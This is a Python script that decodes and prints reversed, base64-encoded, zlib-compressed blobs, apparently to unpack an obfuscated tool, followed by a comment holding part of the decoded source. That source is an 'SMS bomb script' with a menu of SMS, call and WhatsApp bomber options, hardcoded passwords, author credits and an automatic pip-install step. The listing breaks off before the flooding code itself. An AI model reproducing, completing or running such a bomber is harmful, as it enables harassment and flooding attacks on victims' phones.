import zlib
import base64

s = b''
b64 = base64.b64decode(s[::-1])
print(zlib.decompress(b64))

s2 = b''
b64 = base64.b64decode(s2[::-1])
print(zlib.decompress(b64))

s3 = b'=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'
b64 = base64.b64decode(s3[::-1])
print(zlib.decompress(b64))


# Original code :
#b'#!/usr/bin/env python\n# coding: utf-8\n\n# In[9]:\n\n\n# scripted by samay\n# Designed by vaimpier ritik \n# email thread shark \n# sms bomb script \n# 2021 \n\n\n#--------imports \nimport os\nimport sys\ntry:\n    import colorama\n    import requests\n\nexcept ImportError:\n    try:\n        _ = os.system(\'pip install colorama\' if os.name==\'nt\' else \'pip3 install colorama\')\n        _ = os.system(\'pip install requests\' if os.name==\'nt\' else \'pip3 install requests\')\n    except:\n        pass\nimport requests\nfrom time import sleep\nfrom colorama import Fore\n\n\n#------------------------\n\n#---------colors\nr = "\\033[1;31m"\ng = "\\033[1;32m"\ny = "\\033[1;33m"\nb = "\\033[1;34m"\nd = "\\033[2;37m"\nR = "\\033[1;41m"\nY = "\\033[1;43m"\nB = "\\033[1;44m"\nw = "\\033[1;37m"\ng = "\\033[0;90m"\ny = r\n\n#--------functions and programs \n\nlogo = \'\'\'\n    \\033[1;31m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97        \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n    \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n    \\033[0;90m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\\033[1;33m    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\033[1;33m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n    \\033[1;33m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;34m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n    \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91           \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n    \\033[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d           \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d    \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n\'\'\'\n\ndef banner():\n    print(logo)\n\ndef _under_():\n    print(\'\\n\')\n\ndef bye():\n    os.system(\'cls\' if os.name==\'nt\' else \'clear\')\n    banner()\n    string = """ \n    \\033[1;37mDeveloper  \\033[1;34m: \\033[1;31mVaimpier Ritik x sincryptzork x shark\n    \\033[1;37mGithub     \\033[1;34m: \\033[1;31mVaimpierOfficial x Samay825 x shark\n    \\033[1;37mInstagram  \\033[1;34m: \\033[1;31m@vaimpier_ritik x @sincryptzork x @0891322930\n    """\n    for letter in string:\n        sleep(0.01) \n        sys.stdout.write(letter)\n        sys.stdout.flush()\n    print("\\n")\n\ndef clear():\n    _ = os.system(\'cls\' if os.name==\'nt\' else \'clear\')\n    \ndef chutmarike(datasl):\n    print(r+"\xe2\x94\x94\xe2\x94\x80> "+w+"\\033[1;37m"+datasl)\n\ndef front_interfere_look():\n    clear()\n    banner()\n    bye()\n    chutmarike(\'[ 1 ] Blackhat x Sms :\')\n    chutmarike(\'[ 2 ] Blackhat x Call :\')\n    chutmarike(\'[ 3 ] Blackhat x Sms2 :\')\n    chutmarike(\'[ 4 ] Blackhat x Custom Sms :\')\n    chutmarike(\'[ 5 ] Blackhat x Whatsapp Bomber :\')\n    chutmarike(\'[ 6 ] Blackhat x Update :\')\n    chutmarike(\'[ 7 ] Blackhat x Exit :\')\n    _under_()\n    \n#-------------------v\n\'\'\'\nos.system(\'whoami > samay.txt\')\n\nwith open(\'samay.txt\',\'r\') as file:\n    data = file.read()\n\ntry:\n    okstt = data.split()[0]\n    if okstt==\'u0_a1622\':\n        os.remove(\'samay.txt\')\n        pass\n    else:\n        _under_()\n        chutmarike(\'You are not premium user ..\')\n        os.remove(\'samay.txt\')\n        _under_()\n        sys.exit()\n    \n    \nexcept:\n    sys.exit()\'\'\'\n\ndef _cls_front_under():\n    clear()\n    banner()\n    _under_()\n\n_cls_front_under()\n    \n#---------------object oriented programming \n\n\nclass Samay:\n    def __init__(self,_user_com,_user2):\n        self.data = _user_com\n        self.data2 = _user2\n    def Passwordencrypt(self):\n        if self.data==\'vaimsamay123\' and self.data2==\'vaimzork123\':\n            front_interfere_look()\n            try:\n                ops_under = int(input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Desire option : "+r))\n            except:\n                _under_()\n                chutmarike(\'Please Write the number to select option ..\')\n                _under_()\n                sys.exit()\n            aayush = Mainscript(ops_under)\n            aayush.scripting()\n        else:\n            chutmarike(\'Wrong Password please Wait ..\')\n            sleep(2.0)\n            _cls_front_under()\n            ok = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the username : "+r)\n            